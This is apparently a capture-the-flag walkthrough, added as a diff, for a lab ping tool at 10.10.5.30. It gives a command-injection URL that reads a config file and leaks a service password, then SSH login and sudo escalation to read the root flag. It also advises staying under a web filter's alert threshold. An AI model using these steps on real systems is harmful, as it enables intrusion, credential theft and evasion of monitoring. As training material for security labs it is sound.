@@ -1,0 +1,21 @@
+Same leaky ping tool as The Injection Point, but a filter now flags every web request with shell
+characters in it.
+
+1. Read before you poke. nmap -sV 10.10.5.30, then the ordinary pages: curl -s http://10.10.5.30/ links
+   to /about.html, which says the service account's settings are in /var/www/conf/app.ini. Plain page
+   views are not counted.
+
+2. One well-aimed injection. The ping tool still runs whatever you add after a ;, as the web account:
+
+       curl -s 'http://10.10.5.30/tools/ping?host=x;cat /var/www/conf/app.ini'
+
+   prints the appsvc password ({{SVCPW}} on this run) in a single flagged request.
+
+3. Shell and root. ssh appsvc@10.10.5.30 with it, cat flag.txt, then sudo -l and
+   sudo sed -n p /root/flag.txt. This watcher reads only the web log, so sudo on the box isn't counted.
+
+Why the noisy way fails: ;id, ;whoami, ;ls and ;cat one after another are four or five flagged requests.
+The filter tolerates two; past that it raises the alarm and blocks your address.
+
+In real life: web application firewalls and log alerts look for exactly these characters in parameters.
+Recon you can do by reading the site costs nothing; every trick you play is a line in someone's log.
